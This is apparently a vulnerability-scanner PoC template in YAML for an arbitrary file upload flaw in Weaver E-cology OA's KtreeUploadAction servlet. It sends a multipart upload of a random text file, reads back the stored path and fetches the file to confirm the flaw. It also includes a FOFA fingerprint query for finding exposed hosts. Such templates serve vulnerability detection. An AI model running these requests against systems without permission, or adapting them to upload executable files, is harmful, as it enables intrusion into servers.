id: poc-yaml-weaver-e-cology-ktreeuploadaction-anyfile-upload
info:
  name: 泛微OA E-cology KtreeUploadAction 任意文件上传漏洞
  severity: critical
  tags:
  - 两高一弱
  - 文件上传
  finger: e-cology
  fofa: app="泛微-协同商务系统"
variables:
  t1: random_str(4)
  t2: base64(t1)
requests:
- method: POST
  path: /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image
  headers:
    Content-Type: multipart/form-data; boundary=--------1638451160
  data: '----------1638451160

    Content-Disposition: form-data; name="test"; filename="{{.t1}}.txt"

    Content-Type: application/octet-stream


    {{.t2}}

    ----------1638451160--'
  expression: status_code == 200 && contains(body,"SUCCESS")
  output:
  - regex_match(body,`url':'/(?P<path>.*?).txt`)
- method: GET
  path: /{{.path}}.txt
  expression: status_code == 200 && body == t2
transport: http
